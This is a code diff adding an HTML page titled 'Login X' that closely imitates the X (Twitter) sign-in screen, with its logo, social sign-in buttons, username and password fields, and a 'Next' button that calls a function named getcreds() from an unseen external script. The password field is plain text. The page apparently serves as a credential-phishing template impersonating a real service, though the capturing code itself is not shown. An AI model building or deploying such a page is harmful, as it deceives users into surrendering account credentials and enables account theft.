@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet"/>
+    <link rel="stylesheet" href="css/xstyle.css">
+    <script src="script/myjs.js"></script>
+    <title>Login X</title>
+</head>
+<body>
+    <div class="container">
+
+        <div class="header">
+            <div class="close_button">
+                <i class="ri-close-fill"></i>
+            </div>
+            <div class="logo">
+                <i class="ri-twitter-x-fill"></i>
+            </div>
+        </div>
+
+        <div class="content">
+            <h1>Sign in to X</h1>
+
+            <div class="sign_in_buttons">
+                <button class="primary sign_in">
+                    <object data="Images/google.svg"></object>
+                    <span>Sign in with Google</span>
+                </button>
+                <button class="primary sign_in">
+                    <object data="Images/apple.svg"></object>
+                    <span>Sign in with Apple</span>
+                </button>
+            </div>
+
+            <div class="divider">
+                <p>or</p>
+            </div>
+
+            <div class="email_label">
+                <input type="text" id="username" placeholder="email, username">
+                <label for="username">Phone, email address, or username</label>
+            </div>
+            <div class="pass_label">
+                <input type="text" id="passwd" placeholder="email, username">
+                <label for="passwd">Password</label>
+            </div>
+
+            <div class="sign_up_buttons">
+                <button class="primary sign_up" onclick=getcreds()>Next</button>
+                <button class="secondary sign_up">Forgot Password?</button>
+            </div>
+        </div>
+
+        <div class="register">
+            <p>Don´t have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+</body>
+</html>
